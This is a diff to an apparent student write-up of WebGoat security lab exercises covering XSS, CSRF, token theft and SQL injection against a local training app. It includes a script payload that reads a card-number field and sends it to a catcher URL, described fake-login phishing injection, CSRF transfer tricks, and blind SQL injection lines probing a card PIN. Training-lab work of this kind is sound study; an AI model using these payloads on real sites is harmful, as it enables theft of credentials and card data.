@@ -3,13 +3,15 @@
 
 Part 1
 The vulnerability is that malicious HTML code could be injected through the search field in the 
-page. So in my code, a fake login interface is injected to the search frame. When a user use the
-Search functionality, the user may mistakenly think that a login is necessary. Once the user enters 
-Username and password, the information will be sent to the attacker.
+page. So in my code, a fake login interface is injected to the search frame. When a user uses the
+search functionality, a login interface will pop out. The user may mistakenly think that a login is necessary. Once the user enters username and password, the information will be processed through the 
+JavaScript code and sent to the attacker.
 
 
 Part 2
-The 
+Similar to the Part 1, the field to enter credit card number is exploitable. Malicious code could be 
+injected to trigger Money transferral if the user clicks Buy. The code will be used to retrieve card information entered in card number field. The code to be encoded into URL is as follows:
+
 http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=<script>
 var card_num = document.getElementsByName("input1")[0].value;
 var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + card_num;
@@ -19,30 +21,40 @@ XssImage.src = url;
 
 
 Part 3
-
+The vulnerability here is that 
+The email will contain an image whose URL is pointing to a malicious request. Once a user opens the
+Message, the image will be loaded and a transfer will be triggered.
 
 
 Part 4
-
+The vulnerability is similar to Part 3. We include two images in the message. The first is to trigger
+A transfer and the second is to bypass the prompt during the request. The first image will issue the request by setting the transfer equals certain amount. The second one will set it to be CONFIRMED to confirm the transaction.
 
 
 Part 5
-
+The vulnerability here is that the token for the transaction will be returned as in the HTML page. So
+It could be easily exploited. My code first use a iframe and some script to retrieve the token value 
+Included in the page. Then a second iframe will be used to complete the transaction using the token.
 
 
 Part 6
-
+The part has SQL Injection vulnerability. The query interface does not validate the input. So we could
+Trick the program to return more results by setting the WHERE condition always true using OR and TRUE.
 
 
 Part 7
-
+The vulnerability is still SQL Injection. We could use ";" to end last query and trick the program to 
+execute more queries. In this part, we included some UPDATE and TRIGGER clause to the program so that
+We could change the content in the database.
 
 
 Part 8
+Similar to the previous two parts, we could malicious execute more queries to retrieve the information.
+Using the following clauses, we could constantly narrow down our search scope until we find the correct
+Value.
 
 101 and (select pin from credit where cc_number = 1234123412341234) > 3310 and (select pin from credit where cc_number = 1234123412341234) < 3320
 
-101 and (select pin from credit where cc_number = 1234123412341234) = 3318
-
+101 and (select pin from credit where cc_number = 1234123412341234) = 3318 (Valid)
 
 
